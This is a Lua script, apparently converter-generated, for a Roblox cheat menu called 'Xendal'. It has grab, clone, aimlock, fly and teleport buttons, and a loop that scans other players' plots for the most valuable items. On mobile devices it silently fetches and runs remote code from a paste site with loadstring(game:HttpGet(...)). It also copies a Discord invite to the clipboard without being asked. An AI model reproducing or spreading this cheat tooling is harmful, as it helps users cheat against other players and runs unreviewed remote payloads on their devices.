G2L["27f"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["27f"]["Size"] = UDim2.new(0, 109, 0, 33);
G2L["27f"]["Position"] = UDim2.new(0.29267, 0, 0.33652, 0);
G2L["27f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27f"]["Name"] = [[XendalInstaGrab]];
G2L["27f"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Xendal.XendalInstaGrab.LocalScript
G2L["280"] = Instance.new("LocalScript", G2L["27f"]);



-- StarterGui.Xendal.XendalInstaGrab.TextButton
G2L["281"] = Instance.new("TextButton", G2L["27f"]);
G2L["281"]["TextWrapped"] = true;
G2L["281"]["BorderSizePixel"] = 0;
G2L["281"]["TextSize"] = 14;
G2L["281"]["TextScaled"] = true;
G2L["281"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["281"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["281"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["281"]["BackgroundTransparency"] = 1;
G2L["281"]["Size"] = UDim2.new(0, 77, 0, 25);
G2L["281"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["281"]["Text"] = [[InstaGrab]];
G2L["281"]["Position"] = UDim2.new(0.15596, 0, 0.10103, 0);


-- StarterGui.Xendal.XendalInstaGrab.TextButton.LocalScript
G2L["282"] = Instance.new("LocalScript", G2L["281"]);



-- StarterGui.Xendal.XendalInstaGrab.UICorner
G2L["283"] = Instance.new("UICorner", G2L["27f"]);



-- StarterGui.Xendal.XendalInstaGrab.UIStroke
G2L["284"] = Instance.new("UIStroke", G2L["27f"]);
G2L["284"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.XendalCloner
G2L["285"] = Instance.new("Frame", G2L["1"]);
G2L["285"]["BorderSizePixel"] = 0;
G2L["285"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["285"]["Size"] = UDim2.new(0, 123, 0, 47);
G2L["285"]["Position"] = UDim2.new(0.78294, 0, 0.14019, 0);
G2L["285"]["BorderColor3"] = Color3.fromRGB(40, 40, 40);
G2L["285"]["Name"] = [[XendalCloner]];
G2L["285"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Xendal.XendalCloner.LocalScript
G2L["286"] = Instance.new("LocalScript", G2L["285"]);



-- StarterGui.Xendal.XendalCloner.TextButton
G2L["287"] = Instance.new("TextButton", G2L["285"]);
G2L["287"]["TextWrapped"] = true;
G2L["287"]["BorderSizePixel"] = 0;
G2L["287"]["TextSize"] = 14;
G2L["287"]["TextScaled"] = true;
G2L["287"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["287"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["287"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["287"]["BackgroundTransparency"] = 1;
G2L["287"]["Size"] = UDim2.new(0, 101, 0, 26);
G2L["287"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["287"]["Text"] = [[InstaCloner]];
G2L["287"]["Position"] = UDim2.new(0.08397, 0, 0.23333, 0);


-- StarterGui.Xendal.XendalCloner.TextButton.LocalScript
G2L["288"] = Instance.new("LocalScript", G2L["287"]);



-- StarterGui.Xendal.XendalCloner.UICorner
G2L["289"] = Instance.new("UICorner", G2L["285"]);
G2L["289"]["CornerRadius"] = UDim.new(0, 7);


-- StarterGui.Xendal.XendalCloner.UIStroke
G2L["28a"] = Instance.new("UIStroke", G2L["285"]);
G2L["28a"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.XendalAimlock
G2L["28b"] = Instance.new("Frame", G2L["1"]);
G2L["28b"]["BorderSizePixel"] = 0;
G2L["28b"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["28b"]["Size"] = UDim2.new(0, 109, 0, 33);
G2L["28b"]["Position"] = UDim2.new(0.29366, 0, 0.23224, 0);
G2L["28b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28b"]["Name"] = [[XendalAimlock]];
G2L["28b"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Xendal.XendalAimlock.LocalScript
G2L["28c"] = Instance.new("LocalScript", G2L["28b"]);



-- StarterGui.Xendal.XendalAimlock.TextButton
G2L["28d"] = Instance.new("TextButton", G2L["28b"]);
G2L["28d"]["TextWrapped"] = true;
G2L["28d"]["BorderSizePixel"] = 0;
G2L["28d"]["TextSize"] = 14;
G2L["28d"]["TextScaled"] = true;
G2L["28d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28d"]["BackgroundTransparency"] = 1;
G2L["28d"]["Size"] = UDim2.new(0, 74, 0, 17);
G2L["28d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28d"]["Text"] = [[LockPlayer]];
G2L["28d"]["Position"] = UDim2.new(0.14794, 0, 0.24242, 0);


-- StarterGui.Xendal.XendalAimlock.TextButton.LocalScript
G2L["28e"] = Instance.new("LocalScript", G2L["28d"]);



-- StarterGui.Xendal.XendalAimlock.UICorner
G2L["28f"] = Instance.new("UICorner", G2L["28b"]);
G2L["28f"]["CornerRadius"] = UDim.new(0, 7);


-- StarterGui.Xendal.XendalAimlock.UIStroke
G2L["290"] = Instance.new("UIStroke", G2L["28b"]);
G2L["290"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.XendalFps
G2L["291"] = Instance.new("Frame", G2L["1"]);
G2L["291"]["BorderSizePixel"] = 0;
G2L["291"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["291"]["Size"] = UDim2.new(0, 128, 0, 33);
G2L["291"]["Position"] = UDim2.new(0.43295, 0, 0.00167, 0);
G2L["291"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["291"]["Name"] = [[XendalFps]];
G2L["291"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Xendal.XendalFps.LocalScript
G2L["292"] = Instance.new("LocalScript", G2L["291"]);



-- StarterGui.Xendal.XendalFps.fpsLabel
G2L["293"] = Instance.new("TextLabel", G2L["291"]);
G2L["293"]["TextWrapped"] = true;
G2L["293"]["BorderSizePixel"] = 0;
G2L["293"]["TextSize"] = 14;
G2L["293"]["TextScaled"] = true;
G2L["293"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["293"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["293"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["293"]["BackgroundTransparency"] = 1;
G2L["293"]["Size"] = UDim2.new(0, 73, 0, 28);
G2L["293"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["293"]["Text"] = [[999fps]];
G2L["293"]["Name"] = [[fpsLabel]];
G2L["293"]["Position"] = UDim2.new(0.20916, 0, 0.07094, 0);


-- StarterGui.Xendal.XendalFps.fpsLabel.LocalScript
G2L["294"] = Instance.new("LocalScript", G2L["293"]);



-- StarterGui.Xendal.XendalFps.UICorner
G2L["295"] = Instance.new("UICorner", G2L["291"]);
G2L["295"]["CornerRadius"] = UDim.new(0, 7);


-- StarterGui.Xendal.XendalPing
G2L["296"] = Instance.new("Frame", G2L["1"]);
G2L["296"]["BorderSizePixel"] = 0;
G2L["296"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["296"]["Size"] = UDim2.new(0, 128, 0, 33);
G2L["296"]["Position"] = UDim2.new(0.51208, 0, 0.00127, 0);
G2L["296"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["296"]["Name"] = [[XendalPing]];
G2L["296"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Xendal.XendalPing.LocalScript
G2L["297"] = Instance.new("LocalScript", G2L["296"]);



-- StarterGui.Xendal.XendalPing.PingLabel
G2L["298"] = Instance.new("TextLabel", G2L["296"]);
G2L["298"]["TextWrapped"] = true;
G2L["298"]["BorderSizePixel"] = 0;
G2L["298"]["TextSize"] = 20;
G2L["298"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["298"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["298"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["298"]["BackgroundTransparency"] = 1;
G2L["298"]["Size"] = UDim2.new(0, 75, 0, 30);
G2L["298"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["298"]["Text"] = [[999ms]];
G2L["298"]["Name"] = [[PingLabel]];
G2L["298"]["Position"] = UDim2.new(0.2138, 0, 0, 0);


-- StarterGui.Xendal.XendalPing.PingLabel.LocalScript
G2L["299"] = Instance.new("LocalScript", G2L["298"]);



-- StarterGui.Xendal.XendalPing.UICorner
G2L["29a"] = Instance.new("UICorner", G2L["296"]);



-- StarterGui.Xendal.XendalFly
G2L["29b"] = Instance.new("Frame", G2L["1"]);
G2L["29b"]["BorderSizePixel"] = 0;
G2L["29b"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["29b"]["Size"] = UDim2.new(0, 109, 0, 33);
G2L["29b"]["Position"] = UDim2.new(0.29324, 0, 0.28502, 0);
G2L["29b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29b"]["Name"] = [[XendalFly]];
G2L["29b"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Xendal.XendalFly.LocalScript
G2L["29c"] = Instance.new("LocalScript", G2L["29b"]);



-- StarterGui.Xendal.XendalFly.TextButton
G2L["29d"] = Instance.new("TextButton", G2L["29b"]);
G2L["29d"]["TextWrapped"] = true;
G2L["29d"]["BorderSizePixel"] = 0;
G2L["29d"]["TextSize"] = 14;
G2L["29d"]["TextScaled"] = true;
G2L["29d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29d"]["BackgroundTransparency"] = 1;
G2L["29d"]["Size"] = UDim2.new(0, 84, 0, 21);
G2L["29d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29d"]["Text"] = [[Fly]];
G2L["29d"]["Position"] = UDim2.new(0.11009, 0, 0.18182, 0);


-- StarterGui.Xendal.XendalFly.TextButton.LocalScript
G2L["29e"] = Instance.new("LocalScript", G2L["29d"]);



-- StarterGui.Xendal.XendalFly.UICorner
G2L["29f"] = Instance.new("UICorner", G2L["29b"]);
G2L["29f"]["CornerRadius"] = UDim.new(0, 7);


-- StarterGui.Xendal.XendalFly.UIStroke
G2L["2a0"] = Instance.new("UIStroke", G2L["29b"]);
G2L["2a0"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Open
G2L["2a1"] = Instance.new("ImageButton", G2L["1"]);
G2L["2a1"]["BorderSizePixel"] = 0;
G2L["2a1"]["BackgroundTransparency"] = 0.3;
G2L["2a1"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["2a1"]["Size"] = UDim2.new(0, 41, 0, 40);
G2L["2a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a1"]["Name"] = [[Open]];
G2L["2a1"]["Position"] = UDim2.new(0.90378, 0, 0.06414, 0);


-- StarterGui.Xendal.Open.LocalScript
G2L["2a2"] = Instance.new("LocalScript", G2L["2a1"]);



-- StarterGui.Xendal.Open.LocalScript
G2L["2a3"] = Instance.new("LocalScript", G2L["2a1"]);



-- StarterGui.Xendal.Open.UICorner
G2L["2a4"] = Instance.new("UICorner", G2L["2a1"]);
G2L["2a4"]["CornerRadius"] = UDim.new(0.8, 0);


-- StarterGui.Xendal.Open.UIStroke
G2L["2a5"] = Instance.new("UIStroke", G2L["2a1"]);
G2L["2a5"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.NotificationFrame
G2L["2a6"] = Instance.new("Frame", G2L["1"]);
G2L["2a6"]["BorderSizePixel"] = 0;
G2L["2a6"]["BackgroundColor3"] = Color3.fromRGB(0, 244, 244);
G2L["2a6"]["Size"] = UDim2.new(0, 300, 0, 60);
G2L["2a6"]["Position"] = UDim2.new(0.5, -150, 0.1, 0);
G2L["2a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a6"]["Name"] = [[NotificationFrame]];
G2L["2a6"]["BackgroundTransparency"] = 0.2;


-- StarterGui.Xendal.NotificationFrame.NotificationLabel
G2L["2a7"] = Instance.new("TextLabel", G2L["2a6"]);
G2L["2a7"]["TextWrapped"] = true;
G2L["2a7"]["BorderSizePixel"] = 0;
G2L["2a7"]["TextSize"] = 14;
G2L["2a7"]["TextScaled"] = true;
G2L["2a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a7"]["BackgroundTransparency"] = 1;
G2L["2a7"]["Size"] = UDim2.new(0.95667, -10, 1, -10);
G2L["2a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a7"]["Name"] = [[NotificationLabel]];
G2L["2a7"]["Position"] = UDim2.new(0, 9, 0, 5);


-- StarterGui.Xendal.NotificationFrame.UICorner
G2L["2a8"] = Instance.new("UICorner", G2L["2a6"]);



-- StarterGui.Xendal.Notify
G2L["2a9"] = Instance.new("LocalScript", G2L["1"]);
G2L["2a9"]["Name"] = [[Notify]];


-- StarterGui.Xendal.Vercel
G2L["2aa"] = Instance.new("LocalScript", G2L["1"]);
G2L["2aa"]["Name"] = [[Vercel]];


-- StarterGui.Xendal.mobile
local function C_2()
local script = G2L["2"];
	local UserInputService = game:GetService("UserInputService")
	
	local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
	
	if isMobile then
		loadstring(game:HttpGet("https://pastefy.app/yHlLpkWI/raw"))()
	end
	
end;
task.spawn(C_2);
-- StarterGui.Xendal.avatar
local function C_3()
local script = G2L["3"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local gui = script.Parent
	
	local xandals = gui:WaitForChild("Xandal's")
	local profileFrame = xandals:WaitForChild("ProfileFrame")
	
	local usernameLabel = profileFrame:WaitForChild("Username")
	local avatarImage = profileFrame:WaitForChild("AvatarImage")
	local displayNameLabel = profileFrame:WaitForChild("DisplayName") 
	
	usernameLabel.Text = player.Name
	usernameLabel.TextTruncate = Enum.TextTruncate.AtEnd
	usernameLabel.TextWrapped = false
	
	displayNameLabel.Text = player.DisplayName
	displayNameLabel.TextTruncate = Enum.TextTruncate.AtEnd
	displayNameLabel.TextWrapped = false
	
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	
	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	avatarImage.Image = content
	
end;
task.spawn(C_3);
-- StarterGui.Xendal.NotifierScript
local function C_4()
local script = G2L["4"];
	local TweenService = game:GetService("TweenService")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- Referencias a GUI
	local NotificationFrame = script.Parent:WaitForChild("NotificationFrame")
	local NotificationLabel = NotificationFrame:WaitForChild("NotificationLabel")
	
	-- Posiciones del Frame
	local finalPos = UDim2.new(0.5, -150, 0.1, 0) -- visible
	local startPos = UDim2.new(0.5, -150, -0.2, 0) -- arriba, fuera de pantalla
	NotificationFrame.Position = startPos
	NotificationFrame.Visible = false
	
	-- Función para mostrar notificación deslizante
	local function showNotification(text, duration)
		NotificationLabel.Text = text  -- Cambiar solo el texto
		NotificationFrame.Visible = true
	
		-- Tween hacia abajo (sin tocar el tamaño ni el color)
		local tweenIn = TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = finalPos})
		tweenIn:Play()
	
		-- Esperar 'duration' segundos y luego desaparecer
		task.delay(duration or 2, function()
			local tweenOut = TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = startPos})
			tweenOut:Play()
			tweenOut.Completed:Wait()
			NotificationFrame.Visible = false
		end)
	end
	
	-- Variable para almacenar el objeto con mejor valor anterior
	local lastBestObj = nil
	
	-- Función para actualizar el High Value y notificación
	local function updateHighValue(bestObj, value)
		if bestObj and (not lastBestObj or lastBestObj.parent ~= bestObj.parent) then
			-- Ahora mostramos tanto el nombre del objeto como su valor por segundo
			-- Solo se actualiza el texto de la notificación
			showNotification(bestObj.displayText .. " " .. value .. " /s", 3)
		end
		lastBestObj = bestObj
	end
	
	-- EJEMPLO de loop que revisa el High Value (con tu ESP)
	task.spawn(function()
		while true do
			-- Aquí calculas tu High Value, por ejemplo:
			local Plots = workspace:FindFirstChild("Plots")
			local myPlot = nil -- si quieres excluir tu plot
			local bestObj = nil
			local bestValue = -1
	
			if Plots then
				for _, plot in pairs(Plots:GetChildren()) do
					if plot:IsA("Model") and plot ~= myPlot then
						for _, v in pairs(plot:GetDescendants()) do
							if v:IsA("TextLabel") and v.Text and v.Text:find("%$") and v.Text:find("/s") then
								local amount = tonumber(v.Text:gsub("%$",""):gsub(",",""))
								if amount and amount > bestValue then
									bestValue = amount
									bestObj = {
										parent = plot,
										displayText = plot.Name,  -- Mostramos el nombre del plot
										rarity = v.Text  -- Lo podemos dejar para otros usos, si es necesario
									}
								end
							end
						end
					end
				end
			end
	
			-- Actualizar notificación si cambió el High Value
			updateHighValue(bestObj, bestValue)
	
			task.wait(0.5) -- espera medio segundo antes de actualizar
		end
	end)
	
end;
task.spawn(C_4);
-- StarterGui.Xendal.Xandal's.dragg
local function C_b()
local script = G2L["b"];
	local guiFrame = script.Parent
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	guiFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or
			input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	guiFrame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or
			input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
end;
task.spawn(C_b);
-- StarterGui.Xendal.Xandal's.keybing
local function C_c()
local script = G2L["c"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local visible = true
	
	local function toggleGUI()
		visible = not visible
		gui.Visible = visible
	end
	
	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
			toggleGUI()
		end
	end)
	
end;
task.spawn(C_c);
-- StarterGui.Xendal.Xandal's.Top.Close.LocalScript
local function C_11()
local script = G2L["11"];
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	
	button.MouseButton1Click:Connect(function()
		local gui = playerGui:FindFirstChild("Xendal")
		if gui then
			gui:Destroy()
		end
	end)
	
end;
task.spawn(C_11);
-- StarterGui.Xendal.Xandal's.Top.Minimize.LocalScript
local function C_14()
local script = G2L["14"];
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	
	local xendal = playerGui:WaitForChild("Xendal")
	local xandals = xendal:WaitForChild("Xandal's")
	local openButton = xendal:WaitForChild("Open")
	
	button.MouseButton1Click:Connect(function()
		xandals.Visible = false    -- Oculta el frame
		openButton.Visible = true  -- Muestra el botón "Open"
	end)
	
end;
task.spawn(C_14);
-- StarterGui.Xendal.Xandal's.DISCORD.LocalScript
local function C_20()
local script = G2L["20"];
	local link = "https://discord.com/invite/R7ga2Vprjy"
	setclipboard(link)
	
end;
task.spawn(C_20);
-- StarterGui.Xendal.Xandal's.SettingsGui.Options.LocalScript
local function C_25()
local script = G2L["25"];
	local container = script.Parent
	
	local SELECTED_COLOR = Color3.fromRGB(200, 200, 200)
	local NORMAL_COLOR = Color3.fromRGB(22, 22, 22)
	
	local SELECTED_TRANSPARENCY = 0.9
	local NORMAL_TRANSPARENCY = 0.5
	
	local BORDER_COLOR = Color3.fromRGB(255, 255, 255)
	local BORDER_TRANSPARENCY = 0.88
	
	local buttons = {}
	
	for _, btn in ipairs(container:GetChildren()) do
		if btn:IsA("TextButton") then
			table.insert(buttons, btn)
	
			if not btn:FindFirstChild("UIStroke") then
				local stroke = Instance.new("UIStroke")
				stroke.Name = "UIStroke"
				stroke.Thickness = 2
				stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				stroke.Transparency = 1
				stroke.Parent = btn
			end
		end
	end
	
	local function selectButton(selected)
		for _, btn in ipairs(buttons) do
			local stroke = btn.UIStroke
	
			if btn == selected then
				btn.BackgroundColor3 = SELECTED_COLOR
				btn.BackgroundTransparency = SELECTED_TRANSPARENCY
				btn.TextColor3 = Color3.fromRGB(255,255,255)
	
				stroke.Color = BORDER_COLOR
				stroke.Transparency = BORDER_TRANSPARENCY
			else
				btn.BackgroundColor3 = NORMAL_COLOR
				btn.BackgroundTransparency = NORMAL_TRANSPARENCY
				btn.TextColor3 = Color3.fromRGB(120,120,120)
	
				stroke.Transparency = 1
			end
		end
	end
	
	for _, btn in ipairs(buttons) do
		btn.MouseButton1Click:Connect(function()
			selectButton(btn)
		end)
	end
	
	selectButton(buttons[1])
	
end;
task.spawn(C_25);
-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Main.LocalScript
local function C_2a()
local script = G2L["2a"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Settings.Main.Visible = true
		script.Parent.Parent.Parent.Settings.Movement.Visible = false
		script.Parent.Parent.Parent.Settings.Visuals.Visible = false
	end)
end;
task.spawn(C_2a);
-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Visuals.LocalScript
local function C_2c()
local script = G2L["2c"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Settings.Main.Visible = false
		script.Parent.Parent.Parent.Settings.Movement.Visible = false
		script.Parent.Parent.Parent.Settings.Visuals.Visible = true
	end)
end;
task.spawn(C_2c);
-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Movement.LocalScript
local function C_2e()
local script = G2L["2e"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Settings.Main.Visible = false
		script.Parent.Parent.Parent.Settings.Movement.Visible = true
		script.Parent.Parent.Parent.Settings.Visuals.Visible = false
	end)
end;
task.spawn(C_2e);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Main Handler
local function C_37()
local script = G2L["37"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(1) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_37);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id.Button.LocalScript
local function C_49()
local script = G2L["49"];
	script.Parent.MouseButton1Click:Connect(function()
		-- Obtener el texto original de Job ID
		local originalText = script.Parent.Parent.Parent.JobSet.Text
		local originalFont = script.Parent.Parent.Parent.JobSet.Font
		local originalFontSize = script.Parent.Parent.Parent.JobSet.TextSize
		local originalTextColor = script.Parent.Parent.Parent.JobSet.TextColor3
	
		-- Obtener el valor de Job ID desde el TextBox
		local jobId = script.Parent.Parent.Parent.JobSet.Text
	
		-- Comprobar si el Job ID no está vacío
		if jobId ~= "" then
			local success, errorMessage = pcall(function()
				-- Intentar teletransportarse al Job ID
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, jobId, game.Players.LocalPlayer)
			end)
	
			if success then
				-- Si el teletransporte fue exitoso, no hacer nada
				print("Teletransportado exitosamente a la instancia de trabajo.")
			else
				-- Si ocurrió un error, cambiar el texto de JobSet a "Error"
				script.Parent.Parent.Parent.JobSet.Text = "Error"
				script.Parent.Parent.Parent.JobSet.Font = originalFont
				script.Parent.Parent.Parent.JobSet.TextSize = originalFontSize
				script.Parent.Parent.Parent.JobSet.TextColor3 = Color3.fromRGB(255, 0, 0)  -- Rojo para "Error"
	
				-- Después de 0.5 segundos, restaurar el texto original
				wait(0.5)
				script.Parent.Parent.Parent.JobSet.Text = originalText
				script.Parent.Parent.Parent.JobSet.Font = originalFont
				script.Parent.Parent.Parent.JobSet.TextSize = originalFontSize
				script.Parent.Parent.Parent.JobSet.TextColor3 = originalTextColor
			end
		else
			-- Si el Job ID está vacío, cambiar el texto de JobSet a "Error"
			script.Parent.Parent.Parent.JobSet.Text = "Error"
			script.Parent.Parent.Parent.JobSet.Font = originalFont
			script.Parent.Parent.Parent.JobSet.TextSize = originalFontSize
			script.Parent.Parent.Parent.JobSet.TextColor3 = Color3.fromRGB(255, 0, 0)  -- Rojo para "Error"
	
			-- Después de 0.5 segundos, restaurar el texto original
			wait(0.5)
			script.Parent.Parent.Parent.JobSet.Text = originalText
			script.Parent.Parent.Parent.JobSet.Font = originalFont
			script.Parent.Parent.Parent.JobSet.TextSize = originalFontSize
			script.Parent.Parent.Parent.JobSet.TextColor3 = originalTextColor
		end
	end)
	
end;
task.spawn(C_49);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id.Button.LocalScript
local function C_4f()
local script = G2L["4f"];
	local button = script.Parent  -- Tu TextButton
	local jobId = game.JobId      -- Obtiene el Job ID
	local originalText = button.Text  -- Guarda el texto original del botón
	
	button.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(jobId) -- Copia el Job ID al portapapeles
			button.Text = "Copied"
			wait(0.6)
			button.Text = originalText
		end
	end)
	
end;
task.spawn(C_4f);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Main Handler
local function C_82()
local script = G2L["82"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
